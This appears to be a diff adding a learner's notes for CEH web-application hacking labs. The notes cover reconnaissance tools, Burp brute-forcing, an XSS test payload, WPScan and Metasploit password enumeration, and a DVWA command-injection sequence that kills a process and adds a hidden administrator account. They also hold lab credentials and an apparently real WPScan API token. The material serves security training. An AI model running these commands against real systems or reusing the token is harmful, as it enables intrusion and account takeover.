@@ -1,0 +1,120 @@
+#########################################
+#Lab 1: Footprint the Web Infrastructure#
+#########################################
+
+*Task 1: Perform Web Application Reconnaissance using Nmap and Telnet
+Target www.moviescope.com 10.10.1.19
+
+nmap -T4 -A -v www.moviescope.com
+machine name, NetBIOS name, DNS name, MAC address, OS
+
+telnet www.moviescope.com 80
+GET / HTTP/1.0 ENTER ENTER
+displaying information related to the server name and its version, technology used.
+
+*Task 2: Perform Web Application Reconnaissance using WhatWeb
+whatweb www.moviescope.com
+whatweb -v www.moviescope.com
+whatweb -a 3 -v www.moviescope.com
+whatweb --log-verbose=MovieScope_Report www.moviescope.com 
+
+*Task 3: Perform Web Spidering using OWASP ZAP
+waproxy
+Automated Scan
+Attack
+Spider / Alerts
+
+*Task 4: Detect Load Balancers using Various Tools
+DNS load balancers (Layer 4 load balancers) 
+HTTP load balancers (layer 7 load balancers)
+
+dig yahoo.com
+multiple ip addresses is posible using load balancer
+
+lbd yahoo.com
+
+*Task 5: Identify Web Server Directories using Various Tools
+Nmap, Gobuster and Dirsearch tools to identify web server directories on the target website.
+
+nmap -sV --script=http-enum www.moviescope.com
+gobuster dir -u www.moviescope.com -w /home/attacker/Desktop/common.txt
+python3 dirsearch.py -u http://www.moviescope.com
+python3 dirsearch.py -u http://www.moviescope.com -e aspx,png
+python3 dirsearch.py -u http://www.moviescope.com -x 403,400,401
+
+*Task 6: Perform Web Application Vulnerability Scanning using Vega
+It helps you to find and validate SQL Injection, XSS, inadvertently disclosed sensitive information, and other vulnerabilities.
+
+Vega
+New Scan
+
+*Task 7: Identify Clickjacking Vulnerability using ClickjackPoc
+echo "http://www.moviescope.com" | tee domain.txt
+python3 clickJackPoc.py -f domain.txt
+
+########################################
+#Lab 2: Perform Web Application Attacks#
+########################################
+
+*Task 1: Perform a Brute-force Attack using Burp Suite
+http://10.10.1.22/CEH/wp-login.php
+admin / qwerty@123
+proxy / intruder /payload / cluster bomb / set 1 - set 2
+
+*Task 2: Perform Parameter Tampering using Burp Suite
+GET viewprofile?id=1
+Query Parameters. Edit value
+
+*Task 3: Identify XSS Vulnerabilities in Web Applications using PwnXSS
+PwnXSS is an open-source XSS scanner that is used to detect cross-site scripting (XSS) vulnerabilities in websites. 
+
+python3 pwnxss.py -u http://testphp.vulnweb.com
+View CRITICAL Detected XSS link
+
+*Task 4: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications
+<script>alert("Hola Mundo!")</script>
+
+*Task 5: Perform Cross-site Request Forgery (CSRF) Attack
+http://10.10.1.22:8080/CEH/wp-login.php? a
+admin / qwerty@123
+Plugins / Installed Plugins / leenk.me / Activate
+
+wpscan --api-token ZheELLLfv3bEJHm2DEqxDChlKsziLh2C2M5WIyAXNaY --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp
+
+*Task 6: Enumerate and Hack a Web Application using WPScan and Metasploit
+
+ wpscan --api-token ZheELLLfv3bEJHm2DEqxDChlKsziLh2C2M5WIyAXNaY --url http://10.10.1.22:8080/CEH --enumerate u 
+USER LIST
+admin
+cehuser1
+cehuser2
+
+To obtain the passwords, you will use the auxiliary module called wordpress_login_enum (in msfconsole)
+
+service postgresql start
+msfconsole -q
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+Type set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt and press Enter to set the file containing the passwords. (here, we are using the password.txt password file).
+Type set RHOSTS [IP Address of Windows Server 2022] (here, 10.10.1.22) and press Enter to set the target IP address. (Here, the IP address of Windows Server 2022 is 10.10.1.22).
+Type set RPORT 8080 and press Enter to set the target port.
+Type set TARGETURI http://[IP Address of Windows Server 2022]:8080/CEH and press Enter to set the base path to the WordPress website (Here, the IP address of Windows Server 2022 is 10.10.1.22).
+Type set USERNAME admin and press Enter to set the username as admin.
+
+
+*Task 7: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server
+DVWA
+ENTER IP 10.10.1.22
+| hostname
+| whoami
+| tasklist - Microsoft.ActiveDirectory, and note down its process PID (here, 3112)
+| Taskkill /PID 3112 /F
+| dir C:\
+| net user
+| net user Test /Add
+| net user Test
+| net localgroup Administrators Test /Add
+After open Remote Desktop and use the credencial
+
+*Task 8: Exploit a File Upload Vulnerability at Different Security Levels
+
